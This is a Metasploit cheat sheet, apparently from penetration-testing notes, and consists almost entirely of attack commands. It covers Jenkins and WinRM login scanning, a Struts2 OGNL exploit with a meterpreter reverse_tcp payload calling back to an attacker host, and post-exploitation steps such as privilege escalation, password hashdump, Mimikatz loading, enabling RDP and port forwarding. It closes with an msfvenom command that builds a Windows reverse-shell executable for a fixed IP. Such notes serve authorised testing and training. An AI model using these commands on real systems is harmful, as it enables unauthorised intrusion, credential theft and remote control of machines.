---
title: Metasploit
desc: Provides security vulnerabilities and exploit using payloads. It contains Msfconsole, Msfvenom
tags: [ActiveRecon, Jenkins, Linux, PortForwarding, Struts, WinRM]
alts: [ExploitDB, Gobuster, Searchsploit]
website:
render_with_liquid: false
---

## Exploit - Jenkins

```sh
msfconsole
msf > use auxiliary/scanner/http/jenkins_login
msf > set rhosts <target-ip>
msf > set rport <target-port>
msf > options
msf > exploit
```

<br />

## Exploit - Struts2 OGNL

```sh
msfconsole
msf > use multi/http/struts2_content_type_ognl
msf > show payloads
msf > set payload linux/x86/meterpreter/reverse_tcp
msf > set rhosts <target-ip>
msf > set rport <target-port>
msf > set lhost <attacker-ip>
msf > set lport <attacker-port>
msf > options
msf > exploit

# Move to shell
meterpreter > shell
# Upgrade to full functional terminal
SHELL=/bin/bash script -q /dev/null
```

<br />

## Exploit - WinRM

```sh
msfconsole
msf > use auxiliary/scanner/winrm/winrm_login
msf > set rhosts <target-ip>
msf > set rport <target-port>
msf > options
msf > exploit
```

<br />

## Meterpreter - An Interractive Shell

```sh
# Upgrade to meterpreter
msf6 exploit(windows/smb/smb_17_010_eternalblue) > use post/multi/manage/shell_to_meterpreter

# Set session
msf6 exploit(post/multi/manage/shell_to_meterpreter) > set session 1

# Run exploit
msf6 exploit(post/multi/manage/shell_to_meterpreter) > exploit

# Select session for use
msf6 exploit(post/multi/manage/shell_to_meterpreter) > sessions 2

# Display the target machine's info
meterpreter > sysinfo

# Get user who running in the server
meterpreter > getuid

# Attempt to elevate your privileges
meterpreter > getsystem

# Get privileges of current user
meterpreter > getprivs

# Move to the target shell
meterpreter > shell

# Dump all passwords on the machine
meterpreter > hashdump

# Load a new version of Mimikatz
meterpreter > load kiwi

# Check if the target is a virtual machine
meterpreter > run post/windows/gather/checkvm

# Collect local exploits
meterpreter > run post/multi/recon/local_exploit_suggester

# Enable RDP
meterpreter > run post/windows/manage/enable_rdp

# Port Forwarding
# -l: local port
# -p: desitination port on target machine
# -r: remote ip
meterpreter > portfwd add -l 3389 -p 3389 -r <remote-ip>
meterpreter > portfwd delete –l 3389 –p 3389 –r <remote-ip>

...

```

<br />

## Msfvenom - Standalone Payload Generator

```sh
# Get payloads
msfvenom -l payloads
msfvenom -l payloads | grep windows | grep reverse | grep shell

# Show options
msfvenom -p windows/shell_reverse_tcp --list-options

# Set options and execute
msfvenom -p windows/shell_reverse_tcp LHOST=10.4.62.234 LPORT=4444 -f exe > rshell.exe
```